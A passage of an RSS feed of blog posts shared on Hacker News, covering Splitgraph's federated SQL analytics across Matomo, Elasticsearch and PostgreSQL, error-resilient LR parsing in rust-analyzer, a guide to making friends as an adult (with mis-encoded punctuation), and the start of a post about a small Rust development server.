<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><article><div><nav><ol><li><a href="#our-analytics-stack" as="#our-analytics-stack">Our analytics stack</a></li><li><a href="#how-to-bring-the-data-together" as="#how-to-bring-the-data-together">How to bring the data together?</a></li><li><a href="#sample-queries" as="#sample-queries">Sample queries</a><ol><li><a href="#federated-join" as="#federated-join">Federated JOIN</a></li></ol></li><li><a href="#data-modelling" as="#data-modelling">Data modelling</a></li><li><a href="#metabase" as="#metabase">Metabase</a><ol><li><a href="#setting-up" as="#setting-up">Setting up</a></li><li><a href="#insights" as="#insights">Insights</a></li></ol></li><li><a href="#conclusion" as="#conclusion">Conclusion</a></li></ol></nav><p><a href="https://www.splitgraph.com/" as="https://www.splitgraph.com">Splitgraph</a> is powered by data. We use <a href="https://www.metabase.com/" as="https://www.metabase.com/">Metabase</a> to build BI dashboards that can answer questions about how people interact with us. These dashboards reference our Web analytics data, user data and all events happening across the estate. We can find out how many people queried the Splitgraph <a href="https://www.splitgraph.com/connect" as="https://www.splitgraph.com/connect">Data Delivery Network</a> on a given week, how they found Splitgraph, or if they ever pulled a data image.</p><p>This works without any ETL pipelines or a data warehouse. How do we do it?</p><p>Well, we use Splitgraph.</p><p>In this post, we'll talk about our analytics stack. We'll discuss how we use Splitgraph's <a href="https://www.splitgraph.com/docs/ingesting-data/foreign-data-wrappers/introduction" as="https://www.splitgraph.com/docs/ingesting-data/foreign-data-wrappers/introduction"><code>sgr mount</code></a> command to proxy to data from Matomo, Elasticsearch and PostgreSQL. We'll show a sample SQL query that runs a federated JOIN between these three databases. Finally, we'll talk about how we use Metabase to get a clear view of the business.</p><p><img src="https://raw.githubusercontent.com/splitgraph/splitgraph.com/master/content/blog/images/20200918-splitgraph-matomo-elasticsearch-metabase/00-diagram.png"><em>Architecture diagram of our analytics setup.</em></p><section><h2 id="our-analytics-stack">Our analytics stack</h2><p>We hate third-party trackers. At the same time, we would like to know what's happening on the website and across the company in general. In the age of CDNs, a visit to a website might never reach the origin server. HTTP server logs won't show the full story about website visitors.</p><p>To solve that, we started using <strong><a href="https://matomo.org/" as="https://matomo.org/">Matomo</a></strong>. Matomo is an open-source web analytics platform. It offers a similar interface and feature set to Google Analytics. However, unlike GA, it stores all data locally in a MySQL database.</p><p>Besides visiting the website, there's a lot of other ways users can interact with Splitgraph. For example:</p><ul><li>Starring Splitgraph on GitHub or downloading a release</li><li>Querying the Splitgraph <a href="https://www.splitgraph.com/connect" as="https://www.splitgraph.com/connect">Data Delivery Network</a> from an SQL client</li><li>Pushing and pulling <a href="https://splitgraph.com/docs/concepts/images" as="https://splitgraph.com/docs/concepts/images">data images</a> to/from Splitgraph</li><li>Using the <a href="https://www.splitgraph.com/docs/splitgraph-cloud/publish-rest-api" as="https://www.splitgraph.com/docs/splitgraph-cloud/publish-rest-api">REST API</a></li><li>Checking for updates: we use this to estimate the number of active <code>sgr</code> users</li></ul><p>We use <strong>Elasticsearch</strong> to log these and other interesting events.</p><p>Finally, we have a <strong>PostgreSQL</strong> database that stores actual user data. Some of it could be useful to know in an analytics context. For example: a user's primary e-mail address or their GitHub ID.</p></section><section><h2 id="how-to-bring-the-data-together">How to bring the data together?</h2><p>The idea for this setup came to us when we were trying to get some data from the Matomo Web UI. While it is pretty powerful, it's limited in the kinds of reports it can produce. Also, data we'd see in Matomo didn't include anything we store in Elasticsearch.</p><p>We wondered if we could query the data from Matomo's MySQL database directly. The <a href="https://developer.matomo.org/guides/database-schema" as="https://developer.matomo.org/guides/database-schema">schema</a>, albeit complex, is well documented on their website.</p><p>We could ingest data into Elasticsearch. However, we were already using Kibana to visualize Elasticsearch data and its visualizations were sometimes frustrating to use. Basic functionality like plotting sums is only available through scripted Elasticsearch fields.</p><p><img src="https://raw.githubusercontent.com/splitgraph/splitgraph.com/master/content/blog/images/20200918-splitgraph-matomo-elasticsearch-metabase/01-kibana.png"><em>Pictured: five different visualization engines that Kibana lets you use</em></p><p>But then we thought about it some more. Splitgraph itself is built on top of PostgreSQL. One of its features is making PostgreSQL <a href="https://www.splitgraph.com/blog/foreign-data-wrappers" as="https://www.splitgraph.com/blog/foreign-data-wrappers">foreign data wrappers</a> more user-friendly. Splitgraph's <code>sgr mount</code> lets you instantiate an FDW with a single command. You can then query the data directly or snapshot it.</p><p>Could we use a Splitgraph instance and add a MySQL FDW to it to query Matomo data?</p><p>And if we did, could we use an Elasticsearch FDW to proxy to our events data?</p><p>And if we did that, could we use something like <a href="https://www.metabase.com/" as="https://www.metabase.com/">Metabase</a> and point it at Splitgraph, letting it query data across all our data silos?</p><p>Turns out, we could. Here's an abridged version of how we mount Matomo data on a Splitgraph instance. We have a full set of commands on <a href="https://github.com/splitgraph/splitgraph/tree/master/examples/cross-db-analytics" as="https://github.com/splitgraph/splitgraph/tree/master/examples/cross-db-analytics">our GitHub</a>.</p><pre><code>sgr mount mysql_fdw matomo_raw -c matomo:$PASSWORD@matomo-db -o@- &lt;&lt;EOF
{
  "remote_schema": "matomo",
  "tables": {
    "matomo_log_action": {
      "hash": "bigint",
      "idaction": "integer",
      "name": "character varying(4096)",
      "type": "smallint",
      "url_prefix": "smallint"
    },
    "matomo_log_visit": {
      "idvisit": "bigint",
      "idvisitor": "bytea",
      "user_id": "character varying(200)",
      "location_ip": "bytea",
      "referer_url": "text",
      "visit_entry_idaction_name": "integer",
      "visit_entry_idaction_url": "integer",
      "visit_exit_idaction_name": "integer",
      "visit_exit_idaction_url": "integer",
      "visit_first_action_time": "timestamp without time zone",
      "visit_last_action_time": "timestamp without time zone",
      "visit_total_actions": "integer",
      "visitor_count_visits": "integer",
      "visitor_days_since_first": "smallint",
      "visitor_days_since_last": "smallint",
      "visitor_returning": "smallint"
    }
  }
}
EOF
</code></pre><p>In this, we just pull out interesting tables and columns from Matomo. The full Matomo schema spec for Splitgraph is available <a href="https://github.com/splitgraph/splitgraph/blob/master/examples/cross-db-analytics/mounting/matomo.json" as="https://github.com/splitgraph/splitgraph/blob/master/examples/cross-db-analytics/mounting/matomo.json">here</a>.</p><p>To query Elasticsearch, we used a <a href="https://github.com/splitgraph/postgres-elasticsearch-fdw" as="https://github.com/splitgraph/postgres-elasticsearch-fdw">fork</a> of <code>postgres-elasticsearch-fdw</code> with the ability to push down qualifiers. We made it available as an <code>sgr mount</code> subcommand. Here's an example:</p><pre><code>sgr mount elasticsearch -c elasticsearch:9200 -o@- &lt;&lt;EOF
{
  "table_spec": {
    "github_scraper_data": {
      "schema": {
        "id": "text",
        "@timestamp": "timestamp",
        "sg.github.stars": "integer",
        "sg.github.issues": "integer",
        "sg.github.downloads_installer": "integer",
        "sg.github.downloads_osx": "integer",
        "sg.github.downloads_linux": "integer",
        "sg.github.downloads_windows": "integer"
      },
      "index": "sg-misc*",
      "rowid_column": "id"
    }
  }
}
EOF
</code></pre><p>This creates a table that proxies to the data dumped by our GitHub star scraper.</p><p>Adding our PostgreSQL database was easy. We made an analytics user and gave it access a limited amount of useful tables (we wrote about our <a href="https://www.splitgraph.com/blog/integration-tests" as="https://www.splitgraph.com/blog/integration-tests">configuration and credential generation</a> before):</p><pre><code>sgr mount postgres_fdw sgr_auth -c [connstr] -o@- &lt;&lt;EOF
{
  "dbname": "auth",
  "remote_schema": "sgr_auth",
  "tables": [
    "user_emails",
    "profiles"
  ],
  "extra_server_args": {
    "use_remote_estimate": "true",
    "fetch_size": "10000"
  }
}
EOF
</code></pre></section><section><h2 id="sample-queries">Sample queries</h2><p>Let's now query Elasticsearch from Splitgraph and find out how many GitHub stars Splitgraph has:</p><pre><code metastring=""><span>SELECT</span> <span>"sg.github.stars"</span>
<span>FROM</span> elasticsearch_raw<span>.</span>github_scraper_data
<span>ORDER</span> <span>BY</span> <span>"@timestamp"</span> <span>DESC</span>
<span>LIMIT</span> <span>1</span><span>;</span>

 sg<span>.</span>github<span>.</span>stars

             <span>149</span>
<span>(</span><span>1</span> <span>row</span><span>)</span>
</code></pre><p>Only 149?! Make sure to <a href="https://github.com/splitgraph/splitgraph" as="https://github.com/splitgraph/splitgraph">star Splitgraph on GitHub</a> if you're reading this!</p><section><h3 id="federated-join">Federated JOIN</h3><p>As a real-world example, let's say we wanted to:</p><ul><li>Find users that visited our website in the last week</li><li>Also find out how many queries to our Data Delivery Network they made</li><li>Find out their e-mail addresses</li></ul><p>This data lives across three different databases, as discussed. With this setup, we can bring these three silos together with one simple SQL query:</p><pre><code metastring=""><span>SELECT</span>
    v<span>.</span>user_id<span>,</span>
    email<span>,</span>
    last_visit<span>,</span>
    <span>COALESCE</span><span>(</span>total_ddn_queries<span>,</span> <span>0</span><span>)</span> <span>AS</span> total_ddn_queries
<span>FROM</span> sgr_auth<span>.</span>user_emails ue
<span>LEFT</span> <span>OUTER</span> <span>JOIN</span> <span>(</span>
    
    <span>SELECT</span> <span>"sg.api.user_id"</span> <span>AS</span> user_id<span>,</span> <span>COUNT</span><span>(</span><span>1</span><span>)</span> <span>AS</span> total_ddn_queries
    <span>FROM</span> elasticsearch_raw<span>.</span>sql_api_queries
    <span>WHERE</span> <span>"sg.sql.used_images"</span> <span>IS</span> <span>NOT</span> <span>NULL</span>
    <span>GROUP</span> <span>BY</span> user_id
<span>)</span> d
<span>ON</span> ue<span>.</span>user_id::<span>text</span> <span>=</span> d<span>.</span>user_id
<span>JOIN</span> <span>(</span>
    
    
    <span>SELECT</span> user_id<span>,</span> <span>MAX</span><span>(</span>visit_last_action_time<span>)</span> <span>AS</span> last_visit
    <span>FROM</span> matomo_raw<span>.</span>matomo_log_visit v
    <span>WHERE</span> user_id <span>IS</span> <span>NOT</span> <span>NULL</span>
    <span>AND</span> AGE<span>(</span>visit_last_action_time<span>)</span> <span>&lt;</span> <span>'1 week'</span>
    <span>GROUP</span> <span>BY</span> user_id
<span>)</span> v
<span>ON</span> ue<span>.</span>user_id::<span>text</span> <span>=</span> v<span>.</span>user_id
<span>WHERE</span> ue<span>.</span>is_primary <span>IS</span> <span>TRUE</span>
<span>ORDER</span> <span>BY</span> last_visit <span>DESC</span><span>;</span>
</code></pre><p>Here's the query plan for it:</p><pre><code> Sort
   Sort Key: (max(v.visit_last_action_time)) DESC
   -&gt;  Hash Left Join
         Hash Cond: ((ue.user_id)::text = d.user_id)
         -&gt;  Hash Join
               Hash Cond: ((ue.user_id)::text = (v.user_id)::text)
               -&gt;  Foreign Scan on user_emails ue
                     Filter: (is_primary IS TRUE)
               -&gt;  Hash
                     -&gt;  HashAggregate
                           Group Key: v.user_id
                           -&gt;  Foreign Scan on matomo_log_visit v
                                 Filter: (age((CURRENT_DATE)::timestamp without time zone, visit_last_action_time) &lt; '7 days'::interval)
         -&gt;  Hash
               -&gt;  Subquery Scan on d
                     -&gt;  GroupAggregate
                           Group Key: sql_api_queries."sg.api.user_id"
                           -&gt;  Sort
                                 Sort Key: sql_api_queries."sg.api.user_id"
                                 -&gt;  Foreign Scan on sql_api_queries
                                       Filter: ("sg.sql.used_images" IS NOT NULL)
                                       Multicorn: Elasticsearch query to &lt;Elasticsearch([{'host': 'elasticsearch', 'port': 9200}])&gt;
                                       Multicorn: Query: {"query": {"bool": {"must": [{"exists": {"field": "sg.sql.used_images"}}]}}}
</code></pre><p>As you can see, this resolves into a Hash Join across three foreign tables. It also pushes down most of the clauses to the three origin databases:</p><pre><code>[PostgreSQL]
Foreign Scan on user_emails ue
  Filter: (is_primary IS TRUE)

[MySQL]
Foreign Scan on matomo_log_visit v
  Filter: (age((CURRENT_DATE)::timestamp without time zone, visit_last_action_time) &lt; '7 days'::interval)

[Elasticsearch]
-&gt;  Foreign Scan on sql_api_queries
  Filter: ("sg.sql.used_images" IS NOT NULL)
  Multicorn: Query: {"query": {"bool": {"must": [{"exists": {"field": "sg.sql.used_images"}}]}}}
</code></pre><p>Normally, this would require a data warehouse and a few separate ingestion pipelines. With Splitgraph and PostgreSQL, we can query the data at source. This idea is called "data virtualization" or a "data fabric". We call it a "database proxy".</p><p>Is data virtualization always the right solution? No, but it should be a starting point. If performance becomes a concern, we'll be able to snapshot these tables as Splitgraph images. Splitgraph stores data in a columnar format (using
<a href="https://www.splitgraph.com/docs/concepts/objects" as="https://www.splitgraph.com/docs/concepts/objects"><code>cstore_fdw</code></a>), so we'll be able to query it much faster.</p></section></section><section><h2 id="data-modelling">Data modelling</h2><p>We wrote a few views on these source foreign tables that wrangle the data and clean it up. For example (<a href="https://github.com/splitgraph/splitgraph/blob/master/examples/cross-db-analytics/mounting/matomo.sql" as="https://github.com/splitgraph/splitgraph/blob/master/examples/cross-db-analytics/mounting/matomo.sql">SQL on GitHub</a>),…</p></section></div></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase">https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase</a></em></p>]]>
            </description>
            <link>https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515353</guid>
            <pubDate>Fri, 18 Sep 2020 11:20:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Challenging LR Parsing]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24515272">thread link</a>) | @lukastyrychtr
<br/>
September 18, 2020 | https://rust-analyzer.github.io//blog/2020/09/16/challeging-LR-parsing.html | <a href="https://web.archive.org/web/*/https://rust-analyzer.github.io//blog/2020/09/16/challeging-LR-parsing.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Consider this incomplete snippet of Rust code:</p>
<div>
<div>
<pre><code data-lang="rust"><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre><span>fn</span> <span>foo</span><span>(</span>

<span>struct</span> <span>S</span> <span>{</span>
   <span>f</span><span>:</span> <span>u32</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>I want to see an LR parser which produces the following syntax tree
(from <a href="https://rust-analyzer.github.io/manual.html#show-syntax-tree"><strong>Show Syntax Tree</strong></a> rust-analyzer command, with whitespace nodes elided for clarity):</p>
<div>
<div>
<pre><code><table><tbody><tr><td><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td><pre>SOURCE_FILE@0..32
  FN@0..7
    FN_KW@0..2 "fn"
    NAME@3..6
      IDENT@3..6 "foo"
    PARAM_LIST@6..7
      L_PAREN@6..7 "("
  STRUCT@9..31
    STRUCT_KW@9..15 "struct"
    NAME@16..17
      IDENT@16..17 "S"
    RECORD_FIELD_LIST@18..31
      L_CURLY@18..19 "{"
      RECORD_FIELD@23..29
        NAME@23..24
          IDENT@23..24 "f"
        COLON@24..25 ":"
        PATH_TYPE@26..29
          PATH@26..29
            PATH_SEGMENT@26..29
              NAME_REF@26..29
                IDENT@26..29 "u32"
      R_CURLY@30..31 "}"
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>The most error-resilient LR-style parser I know, <a href="https://github.com/tree-sitter/tree-sitter">tree sitter</a>, produces this instead (tree sitter is GLR, this is <strong>not</strong> the style of parsing advocated by the article):</p>
<div>
<div>
<pre><code><table><tbody><tr><td><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
</pre></td><td><pre>source_file [0, 0] - [5, 0])
  ERROR [0, 0] - [4, 1])
    identifier [0, 3] - [0, 6])
    struct_pattern [2, 0] - [4, 1])
      type: type_identifier [2, 0] - [2, 6])
      ERROR [2, 7] - [2, 8])
        identifier [2, 7] - [2, 8])
      field_pattern [3, 3] - [3, 9])
        name: field_identifier [3, 3] - [3, 4])
        pattern: identifier [3, 6] - [3, 9])
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>Note two things about the rust-analyzer’s tree:</p>
<div>
<ul>
<li>
<p>There’s an (incomplete) “function” node for <code>fn foo(</code>.
Unclosed parenthesis doesn’t preclude the parser from recognizing parameter list.</p>
</li>
<li>
<p>Incomplete function does not prevent struct definition from being recognized.</p>
</li>
</ul>
</div>
<p>These are important for IDE support.</p>
<p>For example, suppose that the cursor is just after <code>(</code>.
If we have rust-analyzer’s syntax tree, than we can figure out that we are completing a function parameter.
If we are to get fancy we might find the calls to the (not yet fully written) <code>foo</code>, run type inference to figure out the type of the first argument, and than suggest parameter name &amp; type based on that (not currently implemented — there’s soooooo much yet to be done in rust-analyzer).
And correctly recognizing <code>struct S</code> is important to not break type-inference in the code which uses <code>S</code>.</p>
<p>There’s a lot of literature about error recovery for LR parsers, how come academics haven’t figured this out already?
I have a bold claim to make: error-recovery research in academia is focusing on a problem irrelevant for IDEs.
Specifically, the research is focused on finding “minimal cost repair sequence”:</p>
<div>
<ul>
<li>
<p>a set of edit operations is defined (skip, change or insert token),</p>
</li>
<li>
<p>a “cost” metric is defined to distinguish big and small edits,</p>
</li>
<li>
<p>an algorithm is devised to find the smallest edit which makes the current text parse.</p>
</li>
</ul>
</div>
<p>This is a very academia-friendly problem — there’s a precise mathematical formulation, there’s an obvious brute force solution (try all edits), and there’s ample space for finding polynomial algorithm.</p>
<p>But IDEs don’t care about actually guessing &amp; repairing the text!
They just need to see as much of (possibly incomplete) syntax nodes in the existing text as possible.
When rust-analyzer’s parser produces</p>
<div>
<div>
<pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre>  PARAM_LIST@6..7
    L_PAREN@6..7 "("
STRUCT@9..31
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>it doesn’t think “Oh, I need to insert <code>)</code> here to complete the list of parameters”.
Rather, it sees <code>struct</code> and thinks “Oh wow, didn’t expect that! I guess I’ll just stop parsing parameter list right here”.</p>
<p>So, here’s</p>
<div>
<table>
<tbody><tr>
<td>
<i title="Important"></i>
</td>
<td>
<p>First Challenge</p>
Design error <em>resilient</em> (and not just error <em>recovering</em>) LR parsing algorithm.
</td>
</tr>
</tbody></table>
</div>
<p>Note that error resilience is a topic orthogonal to error reporting.
I haven’t payed much attention to error reporting (in my experience, synchronous reporting of syntax errors in the editor compensates for bad syntax error messages), but it might be the case that MCRS are a good approach to there.</p>
</div></div>]]>
            </description>
            <link>https://rust-analyzer.github.io//blog/2020/09/16/challeging-LR-parsing.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515272</guid>
            <pubDate>Fri, 18 Sep 2020 11:07:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Make Friends as an Adult]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24515221">thread link</a>) | @Parth86
<br/>
September 18, 2020 | https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood | <a href="https://web.archive.org/web/*/https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><h2 data-guide-section-number="1"><span>Need to know</span></h2><div><p>Friends are a treasure. In an uncertain world, they provide a comforting sense of stability and connection. We laugh together and cry together, sharing our good times and supporting each other through the bad. Yet a defining feature of friendship is that itâ€™s voluntary. Weâ€™re not wedded together by law, or through blood, or via monthly payments into our bank accounts. It is a relationship of great freedom, one that we retain only because we want to.</p>
<p>But the downside of all this freedom, this lack of formal commitment, is that friendship often falls by the wayside. Our adult lives can become a monsoon of obligations, from children, to partners, to ailing parents, to work hours that trespass on our free time. A <a href="https://psycnet.apa.org/doiLanding?doi=10.1037%2Febs0000046">study</a> of young adultsâ€™ social networks by researchers at the University of Oxford found that those in a romantic relationship had, on average, two fewer close social ties, including friends. Those with kids had lost out even more. Friendships crumble, not because of any deliberate decision to let them go, but because we have other priorities, ones that arenâ€™t quite as voluntary. The title of the Oxford paper summed up things well: â€˜Romance and Reproduction Are Socially Costlyâ€™.</p>
<p>Such is the pace and busyness of many peopleâ€™s adult lives that they can lose contact with their friends at a rapid rate. For instance, a <a href="https://www.sciencedirect.com/science/article/pii/S0378873313001056?via%3Dihub">study</a> by the Dutch sociologist Gerald Mollenhorst found that, over a period of seven years, people had lost touch with half of their closest friends, on average. Whatâ€™s especially alarming is that many of us seem to be losing friends faster than we can replace them. A <a href="https://psycnet.apa.org/record/2012-13785-001">meta-analysis</a> by researchers in Germany published in 2013 combined data from 177,635 participants across 277 studies, concluding that friendship networks had been shrinking for the preceding 35 years. For example, in studies conducted between 1980 and 1985, participants reportedly had four more friends on average, compared with the participants whoâ€™d taken part in studies between 2000 and 2005.</p>
<p>If weâ€™re not careful, we risk living out our adulthoods friendless. This is a situation thatâ€™s worth avoiding. Friends are not only a great source of fun and <a href="https://www.pewforum.org/2018/11/20/where-americans-find-meaning-in-life/">meaning</a> in life, but studies <a href="https://academic.oup.com/psychsocgerontology/article/74/2/222/3760165">suggest</a> that, without them, weâ€™re also at greater risk of feeling more depressed. Itâ€™s telling that in their <a href="https://journals.sagepub.com/doi/10.1111/1467-9280.00415">study</a> â€˜Very Happy Peopleâ€™ (2002), the American psychologists Ed Diener and Martin Seligman found that a key difference between the most unhappy and most happy people was how socially connected they were. Friends give us so much, which is why we need to invest in making them. Hereâ€™s how.</p></div></div></section><section><div><h2 data-guide-section-number="2"><span>What to do</span></h2><div><p>Making more friends in adulthood is going to take some deliberate effort on your part. Itâ€™s an exciting challenge in theory, but one of the first obstacles youâ€™ll encounter is having enough confidence. Especially if you are shy by nature, putting yourself out there can seem scary, triggering fears of rejection. These fears might lead you to engage in two types of avoidance that will inhibit your ability to make friends. First, you might practise â€˜overt avoidanceâ€™, by not putting yourself in situations where itâ€™s possible to meet new people. Instead of going to your friendâ€™s movie night, with the chance to meet others, you end up staying at home. Second, you might find yourself engaging in â€˜covert avoidanceâ€™, which means that you show up but donâ€™t engage with people when you arrive. You go to the movie night, but while everyone else is analysing the film after itâ€™s over, you stay silent in the corner, petting someoneâ€™s pet corgi and scrolling through Instagram.</p>
<p><strong>Assume that people like you</strong></p>
<p>Both these forms of avoidance are caused by understandable fears of rejection. So imagine how much easier it would be if you knew that, were you to show up in a group of strangers, most of them would love you and find you interesting. This mindset actually has a self-fulfilling quality â€“ an American <a href="https://doi.apa.org/doiLanding?doi=10.1037%2F0022-3514.51.2.284">study</a> from the 1980s found that volunteers who were led to believe that an interaction partner liked them began to act in ways that made this belief more likely to come true â€“ they shared more about themselves, disagreed less, and had a more positive attitude. This suggests that if you go into social situations with a positive mindset, assuming people like you, then itâ€™s more likely that this will actually turn out to be the case.</p>
<p>Of course, you might still be reluctant to assume others like you because you donâ€™t believe itâ€™s true. If this is you, you might take comfort from research that found, on average, that strangers like us more than we realise. The <a href="https://journals.sagepub.com/doi/10.1177/0956797618783714">paper</a>, by Erica J Boothby at Cornell University and colleagues, involved having pairs of strangers chat together for five minutes, to rate how much they liked their interaction partner, and to estimate how much their partner liked them. Across a variety of settings and study durations â€“ in the lab, in a college dorm, at a professional development workshop â€“ the same pattern emerged. People underestimated how much they were liked, a phenomenon that Boothby and her colleagues labelled â€˜the liking gapâ€™.</p>
<p>What wisdom should we take from this research? It can remind us to go into new social events assuming that people will like us. It can keep us from being paralysed by fears of rejection, pushing us to question some of these fears. Try working on your internal dialogue, your inner voice that perhaps makes overly negative assumptions about how people will respond to you. Doing this will help give you the confidence to go out there and start initiating friendly contact with strangers.</p>
<p><strong>Initiate</strong></p>
<p>In <em>We Should Get Together: The Secret to Cultivating Better Friendships</em> (2020), Kat Vellos describes being inspired to write her book after a moment of feeling utterly alone. She was looking for a friend to hang out with, so she posted on Facebook: â€˜Who wants to go eat French fries and talk about life with me?â€™ Everyone who responded lived in another state; her local San Francisco Bay Area friends were all booked up. As she put it:</p>
<blockquote>I didnâ€™t just want to eat snacks and talk about life. I was craving a different kind of life â€“ one that would give me abundant access to friends who wanted to see me as much as I wanted to see them.</blockquote>
<p>This experience made Vellos realise that she needed more friends, so she created and executed a plan to make some. Eventually, she was running two successful meetup groups, and had established friendships with people she liked and wanted to get closer to. How did she change her life? She initiated. Vellos set aside time to reach out to people regularly, to revitalise old relationships and to awaken new ones, to check in, to find time to hang out. Her story reveals how initiative can change the course of our friendships.</p>
<p>To embrace the importance of initiating, you must to let go of the myth that friendship happens organically. You have to take responsibility rather than waiting passively. Science backs this up. Consider a <a href="https://journals.sagepub.com/doi/pdf/10.1177/0265407509106718">study</a> of older adults in the Canadian province of Manitoba. The participants who thought friendship was something that just happened based on luck tended to be less socially active and to feel lonelier when the researchers caught up with them five years later. By contrast, those who thought friendship took effort actually made more effort â€“ for example, by showing up at church or at community groups â€“ and this paid dividends, in that they felt less lonely at the five-year follow-up.</p>
<p>But itâ€™s not just showing up that matters, itâ€™s saying â€˜helloâ€™ when you get there. This means introducing yourself to other people, asking them for their phone numbers, following up and asking them to hang out. Initiating is a process, one that we must do over and over again to make new friendships.</p>
<p>Initiation is particularly important for people who find themselves in new social settings â€“ such as people who have moved to a new city, started a new school or job. In a <a href="https://psycnet.apa.org/record/1987-97266-009">study</a> of first-year undergraduates at the University of Denver in 1980, it was those students who rated themselves as having superior social skills who managed to develop more satisfying social relationships. Moreover, in the Fall, when everyone was new, it was specifically â€˜initiation skillâ€™ that was most important. Once friendships were more stable, it didnâ€™t matter as much.</p>
<p>Although we might fear that other people will turn us down if we initiate with them, the research finds that this is a lot less likely than we might think. When the American psychologists Nicholas Epley and Juliana Schroeder <a href="https://psycnet.apa.org/record/2014-28833-001">asked</a> research participants to open up conversations with their fellow train commuters, can you guess how many of them were shot down? None! Epley and Schroder concluded that: â€˜Commuters appeared to think that talking to a stranger posed a meaningful risk of social rejection. As far as we can tell, it posed no risk at all.â€™</p>
<p><strong>Keep showing up</strong></p>
<p>Once youâ€™ve initiated some new contacts, the challenge of turning them into genuine friendships begins. I learned this lesson when I moved to Atlanta to start a job as assistant professor. At first, I was proactive at making friends. I showed up to events, asked my friends if they knew anyone in the area, and went to some meetup groups. I met a few people, but most of these friendships fizzled. I was good at sparking a connection but struggled to sustain it.</p>
<p>According to Rebecca G Adams, professor of sociology and gerontology at the University of North Carolina at Greensboro, sociologists have long <a href="https://www.nytimes.com/2012/07/15/fashion/the-challenge-of-making-friends-as-an-adult.html">recognised</a> that friendships thrive when we have continuous interaction. My problem with sustaining connection was that I lacked the opportunity for repeated encounters. Going to a lecture, or a happy hour, or a networking event afforded me only one opportunity to connect. If you can, itâ€™s a better idea to sign up for activities that give you multiple opportunities to connect, such as a language class, a writing course, an …</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood">https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood</a></em></p>]]>
            </description>
            <link>https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515221</guid>
            <pubDate>Fri, 18 Sep 2020 10:59:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building Devserver: An Ultra-Tiny Rust Server]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24515095">thread link</a>) | @lukastyrychtr
<br/>
September 18, 2020 | https://ianjk.com/devserver/ | <a href="https://web.archive.org/web/*/https://ianjk.com/devserver/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    <p>For my WebXR work I needed a development-only server to host a static website over HTTPS. I'd only be accessing the files on my local computer and from an Oculus Quest on the same network.</p>
<p>I wanted a server with the following properties:</p>
<ul>
<li>Easy and Fast to install</li>
<li>Zero configuration needed for most cases</li>
<li>Automatic refresh when content changes</li>
<li>HTTPS capable</li>
</ul>
<p>Surprisingly it's difficult to find an easily installed webserver that fits the bill!</p>
<p>So I made a tiny <strong>development-only</strong> server called <code>devserver</code>.</p>
<p><code>devserver</code> is a great tool for local development, but to be completely clear up-front no effort has been made to make it secure for production purposes.</p>
<p>You can check it out on
<a href="https://crates.io/crates/devserver">crates.io</a>
and <a href="https://github.com/kettle11/devserver">github</a>.</p>
<p>In this post I'll describe the process of building <code>devserver</code> in pursuit of the above goals.</p>
<h2 id="easy-and-fast-to-install">Easy and Fast to Install</h2>
<p>If you have Rust you have <code>cargo</code>.</p>
<p>By hosting <code>devserver</code> on <a href="https://ianjk.com/devserver/crates.io">crates.io</a> installation becomes as easy as:</p>
<p><code>cargo install devserver</code></p>
<p>Wonderful.</p>
<p>I love tools that install almost instantly. It's a luxurious desire, but it's a rare feeling to use software that takes up little space and installs quickly. I did not want the installation of <code>devserver</code> to interrupt someone's workflow.</p>
<p>Tools installed with <code>cargo install</code> build the Rust code, and Rust unfortunately has a reputation for slow compile times. Perhaps it'd be possible to distribute a prebuilt binary, but I didn't want to go that route.</p>
<p>Other similar Rust development servers takes 3 minutes to install. <code>devserver</code> takes just 25 seconds. 25 seconds is still too long for my tastes, but it's fine for now.</p>
<p>In order to keep install times low I was very careful choosing crates. <code>devserver</code> only has direct dependencies on the following 4 crates:</p>
<ul>
<li>native-tls</li>
<li>notify</li>
<li>sha-1</li>
<li>base64</li>
</ul>
<p>The Rust ecosystem is full of many excellent crates, but most web related crates are tailored towards the more complex use case of production web servers and as such take a while to build.</p>
<p><code>devserver</code> implements a tiny version of HTTP and WebSockets to accomplish just enough to cover its use cases.</p>
<h3 id="minimalist-http">Minimalist HTTP</h3>
<p><code>devserver</code> contains a tiny HTTP implementation that isn't feature rich, but in practice covers most use cases.</p>
<p>A small function reads the HTTP header into a byte array:</p>
